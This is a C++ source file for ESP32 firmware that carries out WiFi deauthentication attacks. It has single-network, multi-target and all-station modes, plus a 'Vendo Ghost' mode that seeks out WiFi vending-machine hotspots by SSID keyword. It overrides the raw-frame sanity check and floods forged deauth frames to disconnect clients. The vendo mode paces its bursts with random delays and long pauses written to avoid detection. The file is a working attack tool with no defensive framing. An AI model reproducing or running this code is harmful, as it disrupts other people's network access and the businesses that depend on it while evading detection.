#include <WiFi.h>
#include <esp_wifi.h>
#include <vector>
#include "types.h"
#include "deauth.h"
#include "definitions.h"


const char* VENDO_KEYWORDS[] = {"vendo", "wifi", "machine", "piso"};

deauth_frame_t deauth_frame;
deauth_frame_t multi_deauth_frame;
deauth_frame_t vendo_deauth_frame;
int deauth_type = DEAUTH_TYPE_SINGLE;
int eliminated_stations;
std::vector<TargetAP> multi_targets;
int current_multi_target = 0;
unsigned long last_channel_hop = 0;

// Vendo Ghost variables
VendoConfig vendo_config;
bool vendo_ghost_active = false;
unsigned long last_client_check = 0;
unsigned long last_scan_check = 0;
int current_vendo_target = -1;
std::vector<TargetAP> vendo_targets;
bool clients_present = false;
int consecutive_vendo_bursts = 0;
unsigned long long_pause_until = 0;

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}

esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

// Check if SSID matches vendo pattern
bool is_vendo_ssid(String ssid, String unique_name) {
  ssid.toLowerCase();
  unique_name.toLowerCase();
  
  // Check if SSID contains the unique identifier
  if (!ssid.startsWith(unique_name) && ssid.indexOf(unique_name) < 0) {
    return false;
  }
  
  // Check if SSID contains any vendo keywords
  for (int i = 0; i < VENDO_KEYWORDS_COUNT; i++) {
    if (ssid.indexOf(VENDO_KEYWORDS[i]) >= 0) {
      return true;
    }
  }
  
  return false;
}

// Check for connected clients on current channel
bool has_clients_connected() {
  bool clients_found = false;
  
  // Temporarily enable promiscuous mode to check for clients
  esp_wifi_set_promiscuous(true);
  delay(100); // Brief listen period
  
  // Quick scan for any data packets (indicates clients)
  // This is a simplified check - in production you'd want proper packet analysis
  
  esp_wifi_set_promiscuous(false);
  
  // For now, return true to assume clients (you can enhance this)
  return true; 
}

void scan_for_vendo_targets() {
  int num_networks = WiFi.scanNetworks();
  vendo_targets.clear();
  
  DEBUG_PRINTF("Scanning for vendo targets (pattern: *%s* + keywords)...\n", 
    vendo_config.unique_name.c_str());
  
  for (int i = 0; i < num_networks; i++) {
    String ssid = WiFi.SSID(i);
    
    if (is_vendo_ssid(ssid, vendo_config.unique_name)) {
      TargetAP target;
      memcpy(target.bssid, WiFi.BSSID(i), 6);
      target.channel = WiFi.channel(i);
      target.ssid = ssid;
      target.active = true;
      target.consecutive_bursts = 0;
      target.last_attack = 0;
      target.next_attack = millis() + random(STEALTH_MIN_DELAY, STEALTH_MAX_DELAY);
      target.clients_detected = 0;
      
      vendo_targets.push_back(target);
      
      DEBUG_PRINTF("Found vendo target: %s (Ch: %d, BSSID: %02X:%02X:%02X:%02X:%02X:%02X)\n",
        ssid.c_str(), target.channel,
        target.bssid[0], target.bssid[1], target.bssid[2],
        target.bssid[3], target.bssid[4], target.bssid[5]);
    }
    
    // Also check if we have a locked BSSID
    if (vendo_config.bssid_locked && 
        memcmp(vendo_config.target_bssid, WiFi.BSSID(i), 6) == 0) {
      // BSSID match found - add to targets even if SSID changed
      bool already_added = false;
      for (auto& t : vendo_targets) {
        if (memcmp(t.bssid, WiFi.BSSID(i), 6) == 0) {
          already_added = true;
          t.ssid = ssid; // Update SSID in case it changed
          break;
        }
      }
      
      if (!already_added) {
        TargetAP target;
        memcpy(target.bssid, WiFi.BSSID(i), 6);
        target.channel = WiFi.channel(i);
        target.ssid = ssid;
        target.active = true;
        target.consecutive_bursts = 0;
        target.last_attack = 0;
        target.next_attack = millis() + random(STEALTH_MIN_DELAY, STEALTH_MAX_DELAY);
        
        vendo_targets.push_back(target);
        
        DEBUG_PRINTF("Found locked BSSID target: %s\n", ssid.c_str());
      }
    }
  }
  
  DEBUG_PRINTF("Total vendo targets found: %d\n", vendo_targets.size());
}

IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t *raw_packet = (wifi_promiscuous_pkt_t *)buf;
  const wifi_packet_t *packet = (wifi_packet_t *)raw_packet->payload;
  const mac_hdr_t *mac_header = &packet->hdr;

  const uint16_t packet_length = raw_packet->rx_ctrl.sig_len - sizeof(mac_hdr_t);

  if (packet_length < 0) return;

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    if (memcmp(mac_header->dest, deauth_frame.sender, 6) == 0) {
      memcpy(deauth_frame.station, mac_header->src, 6);
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
      }
      eliminated_stations++;
    }
 } else if (deauth_type == DEAUTH_TYPE_MULTI) {
    if (multi_targets.size() > 0 && current_multi_target < multi_targets.size()) {
      TargetAP& current_target = multi_targets[current_multi_target];
      
      // Send deauth whenever we see ANY packet from this AP
      if (memcmp(mac_header->bssid, current_target.bssid, 6) == 0 ||
          memcmp(mac_header->src, current_target.bssid, 6) == 0 ||
          memcmp(mac_header->dest, current_target.bssid, 6) == 0) {
        
        // Broadcast deauth - disconnect ALL clients
        uint8_t broadcast[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        memcpy(multi_deauth_frame.station, broadcast, 6);
        memcpy(multi_deauth_frame.access_point, current_target.bssid, 6);
        memcpy(multi_deauth_frame.sender, current_target.bssid, 6);
        
        for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
          esp_wifi_80211_tx(WIFI_IF_STA, &multi_deauth_frame, sizeof(multi_deauth_frame), false);
          delayMicroseconds(random(100, 300));
        }
        eliminated_stations++;
        
        #ifdef LED
        BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION);
        #endif
      }
    }
  
  } else if (deauth_type == DEAUTH_TYPE_VENDO) {
    // Stealth vendo ghost mode
    if (current_vendo_target >= 0 && current_vendo_target < vendo_targets.size()) {
      TargetAP& current_target = vendo_targets[current_vendo_target];
      
      if (memcmp(mac_header->dest, current_target.bssid, 6) == 0) {
        memcpy(vendo_deauth_frame.station, mac_header->src, 6);
        memcpy(vendo_deauth_frame.access_point, current_target.bssid, 6);
        memcpy(vendo_deauth_frame.sender, current_target.bssid, 6);
        
        // Only send a few frames to be stealthy
        for (int i = 0; i < STEALTH_BURST_COUNT; i++) {
          esp_wifi_80211_tx(WIFI_IF_STA, &vendo_deauth_frame, sizeof(vendo_deauth_frame), false);
          delayMicroseconds(random(100, 500)); // Random micro-delay between frames
        }
        eliminated_stations++;
        current_target.clients_detected++;
        
        DEBUG_PRINTF("Vendo Ghost: Burst sent to %s\n", current_target.ssid.c_str());
      }
    }
  } else {
    // DEAUTH_TYPE_ALL
    if ((memcmp(mac_header->dest, mac_header->bssid, 6) == 0) && 
        (memcmp(mac_header->dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0)) {
      memcpy(deauth_frame.station, mac_header->src, 6);
      memcpy(deauth_frame.access_point, mac_header->dest, 6);
      memcpy(deauth_frame.sender, mac_header->dest, 6);
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
      }
    }
  }
}

void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
  eliminated_stations = 0;
  deauth_type = attack_type;
  deauth_frame.reason = reason;

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    DEBUG_PRINT("Starting Deauth-Attack on network: ");
    DEBUG_PRINTLN(WiFi.SSID(wifi_number));
    memcpy(deauth_frame.access_point, WiFi.BSSID(wifi_number), 6);
    memcpy(deauth_frame.sender, WiFi.BSSID(wifi_number), 6);
    
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(&sniffer);
  } else if (deauth_type == DEAUTH_TYPE_ALL) {
    DEBUG_PRINTLN("Starting Deauth-Attack on all detected stations!");
    WiFi.softAPdisconnect();
    WiFi.mode(WIFI_MODE_STA);
    
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(&sniffer);
  }
}

void start_multi_deauth(std::vector<int> wifi_numbers, uint16_t reason) {
  stop_deauth();
  
  eliminated_stations = 0;
  deauth_type = DEAUTH_TYPE_MULTI;
  multi_targets.clear();
  current_multi_target = 0;
  
  // Do a fresh scan first
  int numNetworks = WiFi.scanNetworks(false, true, false, 300);
  
  for (int wifi_num : wifi_numbers) {
    if (wifi_num >= 0 && wifi_num < numNetworks) {
      TargetAP target;
      memcpy(target.bssid, WiFi.BSSID(wifi_num), 6);
      target.channel = WiFi.channel(wifi_num);
      target.ssid = WiFi.SSID(wifi_num);
      target.active = true;
      multi_targets.push_back(target);
      
      Serial.printf("   ✅ Added target: %s (Ch:%d)\n", target.ssid.c_str(), target.channel);
    }
  }
  
  if (multi_targets.size() == 0) {
    Serial.println("No valid targets for multi-attack!");
    return;
  }
  
  multi_deauth_frame.reason = reason;
  WiFi.softAPdisconnect();
  WiFi.mode(WIFI_MODE_STA);
  
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&sniffer);
  
  esp_wifi_set_channel(multi_targets[0].channel, WIFI_SECOND_CHAN_NONE);
  last_channel_hop = millis();
  
  Serial.printf("⚔️ Multi-deauth started: %d targets, reason=%d\n", multi_targets.size(), reason);
}


void start_vendo_ghost(VendoConfig config) {
  stop_deauth();
  
  vendo_config = config;
  vendo_ghost_active = true;
  deauth_type = DEAUTH_TYPE_VENDO;
  eliminated_stations = 0;
  consecutive_vendo_bursts = 0;
  long_pause_until = 0;
  
  // Initial scan for targets
  scan_for_vendo_targets();
  
  if (vendo_targets.size() == 0) {
    DEBUG_PRINTLN("No vendo targets found! Will continue scanning...");
  }
  
  vendo_deauth_frame.reason = 1; // Default reason code for stealth
  
  WiFi.softAPdisconnect();
  WiFi.mode(WIFI_MODE_STA);
  
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&sniffer);
  
  if (vendo_targets.size() > 0) {
    current_vendo_target = 0;
    esp_wifi_set_channel(vendo_targets[0].channel, WIFI_SECOND_CHAN_NONE);
  }
  
  DEBUG_PRINTF("Vendo Ghost activated! Unique name: %s, Targets: %d\n", 
    config.unique_name.c_str(), vendo_targets.size());
}

void update_vendo_ghost() {
  if (!vendo_ghost_active || deauth_type != DEAUTH_TYPE_VENDO) return;
  
  unsigned long current_time = millis();
  
  // Check if we're in a long pause
  if (long_pause_until > 0 && current_time < long_pause_until) {
    return; // Still in long pause, do nothing
  }
  
  // Periodic scan for new/updated targets
  if (current_time - last_scan_check >= STEALTH_SCAN_INTERVAL) {
    scan_for_vendo_targets();
    last_scan_check = current_time;
    
    if (vendo_targets.size() > 0 && current_vendo_target == -1) {
      current_vendo_target = 0;
    }
  }
  
  // If no targets, keep scanning
  if (vendo_targets.size() == 0) return;
  
  // Rotate through targets
  if (current_vendo_target >= vendo_targets.size()) {
    current_vendo_target = 0;
  }
  
  TargetAP& target = vendo_targets[current_vendo_target];
  
  // Check if it's time to attack this target
  if (current_time >= target.next_attack) {
    // Switch to target's channel
    esp_wifi_set_channel(target.channel, WIFI_SECOND_CHAN_NONE);
    
    // Quick check for clients before attacking
    delay(50); // Brief settle time
    
    // Send stealth burst
    DEBUG_PRINTF("Vendo Ghost: Attacking %s on channel %d\n", 
      target.ssid.c_str(), target.channel);
    
    // Attack is handled by sniffer when it detects packets
    target.last_attack = current_time;
    target.consecutive_bursts++;
    consecutive_vendo_bursts++;
    
    // Calculate next attack time with random delay
    unsigned long delay_time;
    
    // Check if we need a longer pause
    if (consecutive_vendo_bursts >= STEALTH_MAX_CONSECUTIVE) {
      // Take a longer break to avoid detection
      delay_time = random(STEALTH_LONG_PAUSE_MIN, STEALTH_LONG_PAUSE_MAX);
      long_pause_until = current_time + delay_time;
      consecutive_vendo_bursts = 0;
      
      DEBUG_PRINTF("Vendo Ghost: Long pause for %lu seconds\n", delay_time / 1000);
    } else {
      // Normal random delay
      delay_time = random(STEALTH_MIN_DELAY, STEALTH_MAX_DELAY);
    }
    
    target.next_attack = current_time + delay_time;
    
    // Move to next target
    current_vendo_target = (current_vendo_target + 1) % vendo_targets.size();
    
    DEBUG_PRINTF("Vendo Ghost: Next attack in %lu seconds\n", delay_time / 1000);
  }
  
  // Small delay to prevent tight looping
  delay(100);
}

void update_multi_attack() {
  if (deauth_type != DEAUTH_TYPE_MULTI || multi_targets.size() == 0) return;
  
  unsigned long current_time = millis();
  
  if (current_time - last_channel_hop >= CHANNEL_HOP_INTERVAL) {
    current_multi_target = (current_multi_target + 1) % multi_targets.size();
    
    int attempts = 0;
    while (!multi_targets[current_multi_target].active && attempts < multi_targets.size()) {
      current_multi_target = (current_multi_target + 1) % multi_targets.size();
      attempts++;
    }
    
    if (multi_targets[current_multi_target].active) {
      esp_wifi_set_channel(multi_targets[current_multi_target].channel, WIFI_SECOND_CHAN_NONE);
    }
    
    last_channel_hop = current_time;
  }
}

void stop_deauth() {
  DEBUG_PRINTLN("Stopping all attacks...");
  esp_wifi_set_promiscuous(false);
  deauth_type = DEAUTH_TYPE_SINGLE;
  multi_targets.clear();
  vendo_targets.clear();
  current_multi_target = 0;
  current_vendo_target = -1;
  vendo_ghost_active = false;
  consecutive_vendo_bursts = 0;
  
}

int get_current_multi_channel() {
  if (deauth_type == DEAUTH_TYPE_MULTI && current_multi_target < multi_targets.size()) {
    return multi_targets[current_multi_target].channel;
  }
  return 0;
}

bool is_multi_attack_running() {
  return deauth_type == DEAUTH_TYPE_MULTI && multi_targets.size() > 0;
}

bool is_vendo_ghost_running() {
  return vendo_ghost_active;
}

void set_vendo_unique_name(String name) {
  vendo_config.unique_name = name;
}